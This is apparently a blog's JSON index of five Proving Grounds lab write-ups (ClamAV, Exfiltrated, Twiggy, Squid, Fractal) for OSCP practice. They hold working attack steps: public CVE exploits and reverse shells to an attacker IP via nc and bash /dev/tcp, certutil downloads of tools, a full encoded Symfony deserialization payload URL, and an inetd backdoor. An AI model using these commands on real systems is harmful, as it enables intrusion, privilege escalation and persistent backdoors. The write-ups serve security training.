[
  
  {
    "title": "Proving Grounds - ClamAV",
    "url": "/arthurhendrich.github.io/posts/Proving-Grounds-ClamAV/",
    "categories": "Proving Grounds, Easy",
    "tags": "Linux, SNMP, ClamAV-Milter, OSCP",
    "date": "2024-07-14 00:00:00 -0300",
    





    
    "snippet": "ClamAV was an insightful box to explore exploitation techniques for services like ClamAV-Milter.The process started with comprehensive information gathering, including a full port scan revealing va...",
    "content": "ClamAV was an insightful box to explore exploitation techniques for services like ClamAV-Milter.The process started with comprehensive information gathering, including a full port scan revealing various open ports.The HTTP enumeration led to identifying and decoding a binary message, providing a potential password.Enumeration of SNMP services helped identify the running ClamAV-Milter service.The exploitation phase involved searching for relevant exploits and utilizing a Perl script to create a backdoor by modifying the /etc/inetd.conf file, which enabled root shell access through a netcat connection on a specified port.Diagramgraph TD    A[Information Gathering] --&gt;|Port Scan| B[Enumeration]    B --&gt;|Identify HTTP| C[Explore HTTP Content]    C --&gt;|Find Binary Info| D[Decode Password]    D --&gt;|Enumerate SNMP| E[Identify ClamAV-Milter]    E --&gt;|Search Exploits| F[Exploit ClamAV-Milter]    F --&gt;|Execute Perl Script| G[Create Backdoor]    G --&gt;|Connect via Netcat| H[Root Shell]Information GatheringIP=192.168.184.42Port scan      nmap -sS -Pn -n -T4 --open $IP            nmap -sS -Pn -n -T4 --open -p- $IP - new port 6000            nmap -sVC -Pn -n -p 22,25,80,139,199,445,60000 $IP      EnumerationHTTP 80      http://192.168.184.42/ → Info in binary. Also the title is called Ph33r, looks like an User.            translating binary - ifyoudontpwnmeuran00b -  Looks like an password            feroxbuster -u http://$IP -k -C 404,403,500,502  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100      SNMP 199 &amp; 25      snmpwalk -c public -v1 $IP - Nothing useful            snmp-check $IP -c public          It’s running  ClamAV-Milter3782 runnable clamav-milter /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctlExploitationClamAVNow searching for scripts for ClamAV-Milter      searchsploit ClamAV-Milter → Only in perl            cat 4761.pl      This script exploits a vulnerability in Sendmail when used with ClamAV’s milter to append a malicious command to /etc/inetd.conf, effectively creating a backdoor that grants root access via a shell on a specified TCP port (31337). The script then restarts the inetd service to activate the backdoor.      perl 4761.pl $IP            nc $IP 31337/bin/sh -i            flag      "
  },
  
  {
    "title": "Proving Grounds - Exfiltrated",
    "url": "/arthurhendrich.github.io/posts/Proving-Grounds-Exfiltrated/",
    "categories": "Proving Grounds, Easy",
    "tags": "Linux, Web, Subrion, Exiftool, OSCP",
    "date": "2024-07-13 00:00:00 -0300",
    





    
    "snippet": "Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.Initial enumeration led ...",
    "content": "Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.Initial enumeration led to the discovery of Subrion CMS, and default credentials allowed for access to the admin panel.By exploiting a file upload vulnerability, a reverse shell was obtained. Further enumeration revealed a cron job running Exiftool on uploaded images, which was leveraged to escalate privileges and capture the flag.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[Identify Subrion CMS]    B --&gt;|Default Credentials| C[Admin Panel Access]    C --&gt;|File Upload Vulnerability| D[Upload Reverse Shell]    D --&gt;|Execute Reverse Shell| E[Gain Initial Access]    E --&gt;|Cron Job Enumeration| F[Identify Exiftool Usage]    F --&gt;|Exploit Exiftool| G[Privilege Escalation]    G --&gt;|Capture Flag| H[Success]Information GatheringPortscan      nmap -sS -Pn -n -T4 --open 192.168.177.163            nmap -sS -Pn -n -T4 --open 192.168.177.163 -p-            nmap -sVC -Pn -n -p 22,80 192.168.177.163      EnumerationHTTP 80      http://192.168.177.163 → redirects to exfiltrated.offsec            cat /etc/hosts            http://exfiltrated.offsec/ → Subrion CMS            http://exfiltrated.offsec/robots.txt            http://exfiltrated.offsec/panel/ → Panel Login. CMS v4.2.1            searchsploit Subrion CMS 4.2.1            Subrion default credentials: admin/admin            http://exfiltrated.offsec/panel/members/add/ → made login              Once authenticated i tried this exploit  https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCEAfter read the exploit i decided to put an reverse shell inside the http://exfiltrated.offsec/panel/uploads/      cat revShell.phar            http://exfiltrated.offsec/panel/uploads/            http://exfiltrated.offsec/uploads/revShell.pharrlwrap nc -lvnp 80      Priv Escalation      cat /etc/cron*            cat /opt/image-exif.sh            ls -lh /opt/image-exif.sh            ls -ld /var/www/html/subrion/uploads /opt/metadata      Since the cron script writes EXIF metadata to a log file in /opt/metadata using the exiftool command, one possible attack vector is to exploit a symlink attack if the script does not properly handle symbolic links.      exiftool -ver            searchsploit exiftool      Searching more i found this repositoryhttps://github.com/mr-tuhin/CVE-2021-22204-exiftool.gitBut wasn’t working because of the bbz      sudo apt-get install imagemagick djvulibre-bin exiftool        python3 exploit.py 192.168.45.194 4430            http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw            http://exfiltrated.offsec/uploads/image.jpgrlwrap nc -lvnp 4430            Flag.txt      "
  },
  
  {
    "title": "Proving Grounds - Twiggy",
    "url": "/arthurhendrich.github.io/posts/Proving-Grounds-Twiggy/",
    "categories": "Proving Grounds, Easy",
    "tags": "Linux, Web, SaltStack, OSCP",
    "date": "2024-07-12 00:00:00 -0300",
    





    
    "snippet": "Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.The machine required initial enumeration to identify open services, followed by a specific focus on the web service ...",
    "content": "Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.The machine required initial enumeration to identify open services, followed by a specific focus on the web service running on port 8000.By identifying and leveraging the salt-api service, a known exploit for SaltStack 3000.1 was used to gain access and execute a reverse shell.This machine provided practical experience in handling and exploiting SaltStack configurations.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[Identify SaltStack]    B --&gt;|Web Service on 8000| C[Explore SaltStack API]    C --&gt;|Find Exploit| D[Execute Exploit]    D --&gt;|Gain Access| E[Execute Reverse Shell]    E --&gt;|Obtain Access| F[Privilege Escalation]    F --&gt;|SaltStack Privilege Escalation| G[Capture Evidence]    G --&gt;|Success| H[Completion]Information GatheringPort Scan      nmap -sS -Pn -n -T4 -p- --open 192.168.177.62            nmap -sVC -Pn -n -p 22,53,80,4505,4506,8000 192.168.177.62      EnumerationHTTP 8080      http://192.168.177.62:8000/ → This looks like some clients for the webserver.      So i decided to try access some url’s that are mistaken on purpose.      http://192.168.177.62:8000/local → Powered by CherryPy 5.6.0            feroxbuster -u http://192.168.177.62:8000 -k -C 404,403,500  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100            http://192.168.177.62:8000/login → Says “Please log in”            curl -X POST http://192.168.177.62:8000/login -d \"username=admin&amp;password=admin\" → Unauthorized            Intercepting the login request in the burp                Verifying the response of the requisition      HTTP/1.1 200 OK  Server: nginx/1.16.1  Date: Thu, 04 Jul 2024 20:29:32 GMT  Content-Type: application/json  Content-Length: 43  Connection: close  Access-Control-Expose-Headers: GET, POST  Vary: Accept-Encoding  Allow: GET, HEAD, POST  Access-Control-Allow-Credentials: true  Access-Control-Allow-Origin: *  Www-Authenticate: Session  Set-Cookie: session_id=178a37984d63e3d4ea4a4a39d686e300e2256436; expires=Fri, 05 Jul 2024 06:29:32 GMT; Path=/  X-Upstream: salt-api/3000-1      {\"status\": null, \"return\": \"Please log in\"}          I also can get the same answer with this command:      curl -v -X GET http://192.168.177.62:8000/login      It have the X-Upstream: salt-api/3000-1.ExploitationSalt-APIThat information about the requisition, indicates the request was handled upstream by a service identified as salt-api version 3000-1. This suggests the server might be running SaltStack, a configuration management tool.      Search in the google for salt-api/3000-1 → There’s an exploit for SaltStack 3000.1            https://github.com/jasperla/CVE-2020-11651-poc/tree/master        python3 exploit.py -m 192.168.177.62 -r /etc/shadow      Once that i wanted an reverse shell, this script wasn’t promisor, so i found this one:      https://github.com/bravery9/SaltStack-Exp/tree/master        python3 exp.py --master 192.168.177.62 -lh 192.168.45.227 -lp 80            rlwrap nc -lvnp 80            flag      "
  },
  
  {
    "title": "Proving Grounds - Squid",
    "url": "/arthurhendrich.github.io/posts/Proving-Grounds-Squid/",
    "categories": "Proving Grounds, Easy",
    "tags": "Windows, Web, Squid, OSCP",
    "date": "2024-07-11 00:00:00 -0300",
    





    
    "snippet": "Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privil...",
    "content": "Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.The process included using spose to identify internal services, leveraging the proxy to access a WampServer, and ultimately using FullPowers.exe and PrintSpoofer to gain SYSTEM access.This machine was a great way to practice working with proxy configurations and Windows privilege escalation.Diagramgraph TD    A[Host Enumeration]    A --&gt;|Nmap Scan| B[Identify Squid Proxy]    B --&gt;|Explore Proxy Configuration| C[Tool: spose]    C --&gt;|Identify Internal Services| D[Web Service on 8080]    D --&gt;|Access WampServer| E[Identify phpMyAdmin]    E --&gt;|Bypass Authentication| F[Upload PHP Shell]    F --&gt;|Execute Reverse Shell| G[WinPEAS Enumeration]    G --&gt;|Identify Privilege Escalation| H[Leverage FullPowers.exe]    H --&gt;|Enable SeImpersonatePrivilege| I[Use PrintSpoofer]    I --&gt;|Privilege Escalation to SYSTEM| J[Obtain Root Access]    J --&gt;|Capture Evidence| K[Success]Information GatheringPort Scan      nmap -sS -Pn -n -T4 192.168.217.189 -p 135,139,445,3128            nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v      EnumerationHTTP 80      http://192.168.217.189:3128/ → Apparently the website uses squid/4.14      Squid is a caching and forwarding HTTP web proxy. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.This is the squid repo https://github.com/squid-cache/squidI was searching in the GitHub, etc., but nothing worked. So i decided to try this:https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid      curl --proxy http://192.168.217.189:3128 http://192.168.45.227 →  Directory Listening in my own machine      So after a while i decided to try this tool https://github.com/aancw/spose.git      python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227      Ok, verifying if it’s an web page running in 8080      curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080      Now setting up an http proxy with the extension Proxy Switcher https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com      proxy swithcer      And now trying to access it      http://192.168.237.189:8080/ → It’s a WampServer 3.2.3 - 64bit            http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap            http://192.168.237.189:8080/phpmyadmin/index.php → login panel MySQL - tried default creds (root:)          Verifying some documentation about phpMyAdmin…https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f      http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema                http://192.168.237.189:8080/uploader.php      Reverse shell must be for windowshttps://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php  http://192.168.237.189:8080/php_reverse_shell.php      sudo  rlwrap nc -lvnp 80 → Nt authorithy            flag      Priv EscalationThe first thing that i want to do is revoke all firewalls. I’ve tried but the user don’t have permission.So after a while i decided to put winPEAS inside the machine      certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe            winPEASx64.exe → Apparently https://exploit-db.com/exploits/46718 - CVE-2019-0836 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation                  Ok, nothing worked, but after enumerate, and after i saw that i was an nt authority but with “local service’      whoami      I found this https://itm4n.github.io/localservice-privileges/?ref=benheater.com After read the article i found that he did an script https://github.com/itm4n/FullPowers/releases      certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe            FullPowers.exe -c \"C:\\Users\\Public\\Documents\\nc.exe 192.168.45.227 4430 -e cmd\" -zsudo rlwrap nc -lvnp 4430            whoami /priv → Now i’ve SeImpersoantePrivilage enabled      So i’ll use the https://github.com/itm4n/PrintSpoofer/releases      certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe            PrintSpoofer64.exe -i -c cmd → Priv escalado            flag      "
  },
  
  {
    "title": "Proving Grounds - Fractal",
    "url": "/arthurhendrich.github.io/posts/Proving-Grounds-Fractal/",
    "categories": "Proving Grounds, Easy",
    "tags": "Linux, Web, Symfony, MySQL, OSCP",
    "date": "2024-07-10 00:00:00 -0300",
    





    
    "snippet": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensi...",
    "content": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensitive files and obtaining database credentials.Using these credentials, a Symfony exploit script was executed to achieve Remote Code Execution (RCE) and gain a reverse shell.Privilege escalation involved creating a new user via MySQL, allowing SSH access with elevated privileges, eventually leading to root access.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[HTTP Enumeration]    B --&gt;|Identify Symfony| C[Explore Symfony Profiler]    C --&gt;|Find Sensitive Files| D[Exploit Symfony]    D --&gt;|Obtain Database Credentials| E[Use Symfony Exploit Script]    E --&gt;|RCE| F[Reverse Shell]    F --&gt;|Privilege Escalation| G[Create user via MySQL]    G --&gt;|Create User| H[SSH Access]    H --&gt;|User Benoit| I[Root Access]Information GatheringPort Scan      nmap -sS -Pn -n --open -p- -T4 192.168.192.233            nmap -sVC -p 21,22,80 192.168.192.233      EnumerationHTTP 80      http://192.168.192.233/            http://192.168.192.233/robots.txt → CMS symfony 3.4      I Forced an error to appear      http://192.168.192.233/app_dev.php/randomfile        http://192.168.192.233/app_dev.php/_profiler/empty/search/results?limit=10      https://github.com/symfony/symfony/issues/28002            Profile Token      Accessed as if it were an admin panel.      http://192.168.192.233/app_dev.php/_profiler/c7b124      Checking the branch on GitHub, it is possible to view documentation about upgrading Symfony 3.x, so we might find sensitive files.      https://github.dev/symfony/symfony/tree/3.4      Then I decided to investigate the _profiler to find directories since I tried passing it as a URL and got nothing. I filtered by all these statuses to avoid issues.  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.233/app_dev.php/_profiler/FUZZ -fs 47400,47401,47402,47403,47404,47405,47406,47407,47408,47409,47410,47411,47412,47413,47414,47415,47416,47417,47418,47419,47420,47421,47422,47423,47424,47425,47426,47427,47428,47429,47430,47431,47432,47433,47434,47435,47436,47437,47438,47439,47440,47441,47442,47443,47444,47445,47446,47447,47448,47449,47450,47451,47452,47453,47454,47455,47456,47457,47458,47459,47460,47461,47462,47463,47464,47465,47466,47467,47468,47469,47470,47471,47472,47473,47474,47475,47476,47477,47478,47479,47480,47481,47482,47483,47484,47485,47486,47487,47488,47489,47490,47491,47492,47493,47494,47495,47496,47497,47498,47499Found 2 directories “latest” and “open”Investigating the latest had nothing…Says the file is not readable. So, I will try to read the file found “.yml” on GitHub.      http://192.168.192.233/app_dev.php/_profiler/open            ffuf -u http://192.168.192.233/app_dev.php/_profiler/open?FUZZ=app/config/parameters.yml -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -fs 5522 → Found “file”      Now accessing the URL, I’ve found Database credentials.      http://192.168.192.233/app_dev.php/_profiler/open?file=app/config/parameters.yml      ExploitationSearching a lot, I found the following article https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5  https://raw.githubusercontent.com/ambionics/symfony-exploits/main/secret_fragment_exploit.pyInside it, there is an exploit from a fragment. I tried to enumerate the secret but found nothing.      python3 secret_fragment_exploit.py http://192.168.192.233/_fragment      Then I decided to use the secret found in the database.      python3 secret_fragment_exploit.py 'http://192.168.192.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.192.233/_fragment' --function system --parameters \"id\"      Now accessing the generated URL. I was able to execute commands.      http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=11%2FxvG%2BUpm6nlv7maKqSHFIXdN0BjTshxq568sphXaU%3D            python3 secret_fragment_exploit.py '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--method 2 \\--secret '48a8538e6260789558f0dfe29861c05b' \\--algo 'sha256' \\--internal-url '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--function system \\--parameters \"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.227/80 0&gt;&amp;1'\"        http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A52%253A%2522bash%2B-c%2B%2527bash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252F192.168.45.227%252F80%2B0%253E%25261%2527%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=PC7%2FGws9sawDouQ0AzUn3VpCDiEZhuUcPt01QQOMvx4%3D      rlwrap nc -lvnp 80            local.txt      Priv Escalation      cat /etc/passwd → there is the user benoit      I previously obtained access to database information, let’s check and access it.      netstat -nlpt      I tried to access MySQL with the credentials obtained earlier but failed. Then I looked for cron, kernel version, SSH, etc., but found nothing. So I decided to look at the FTP configuration files.      ls -lah /etc/proftpd            cat sql.conf      Let’s connect to SQL.      mysql -u proftpd -p proftpd : protfpd_with_MYSQL_password →      It seems to have a password for www to access proftpd. FTP authentication through ProFTPDI will create a new password for the user benoit who already exists in the system.In the {md5} base64-encoded format. Therefore, the right way to generate a password for the user benoit is to use the base64-encoded MD5 hash method.  /bin/echo \"{md5}\"/bin/echo -n \"hendrich\" | openssl dgst -binary -md5 | openssl enc -base64      INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}wZjbZseC3NVjPeEobwukRg==', 1000, 1000, '/', '/bin/bash', 0, NOW(), NOW());      Now logging into FTP      ftp 192.168.192.233 benoit:hendrich            ssh-keygen        cp id_rsa.pub authorized_keys  mkdir .ssh      put authorized_keys            ssh -i id_rsa benoit@192.168.192.233            sudo -l → has permission to execute everything. sudo su works            flag      "
  }
  
]

